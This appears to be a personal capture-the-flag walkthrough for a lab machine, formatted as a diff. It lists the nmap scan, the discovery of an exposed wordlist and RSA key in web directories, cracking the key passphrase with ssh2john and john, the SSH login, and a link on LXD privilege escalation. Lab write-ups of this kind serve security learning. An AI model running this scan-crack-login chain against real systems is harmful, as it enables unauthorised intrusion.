@@ -1,0 +1,29 @@
+First started with a initnmap scan found ssh and a websever
+nmap -sC -sV -o intscan 10.10.188.182
+
+Started clicking on links on the website and found a upload section and takes me to a non upload page but a place were uploaded files go
+http://10.10.188.182/uploads/
+found a password list
+http://10.10.188.182/uploads/dict.lst
+found a note in the index.html file possibale username
+<!-- john, please add some actual content to the site! lorem ipsum is horrible to look at. -->
+
+found a directory /secret/ and found a rsa key
+http://10.10.188.182/secret/secretKey
+
+I tried to crack ssh with username john and the password list i found did not find anything
+
+I did ssh2john and made a hash file and then used john to crack it
+ssh2john secretKey > id_rsa.hash
+john --wordlist=dict.lst id_rsa.hash
+
+then found a password for the rsa key
+letmein          (secretKey)
+
+Then i was able to ssh in
+ssh john@10.10.188.182 -i secretKey
+
+then i looked around a bit did not find anything so I went and downloaded linpeas onto the box
+
+To get root have to exploit lxd here is the artical for it
+https://www.hackingarticles.in/lxd-privilege-escalation/
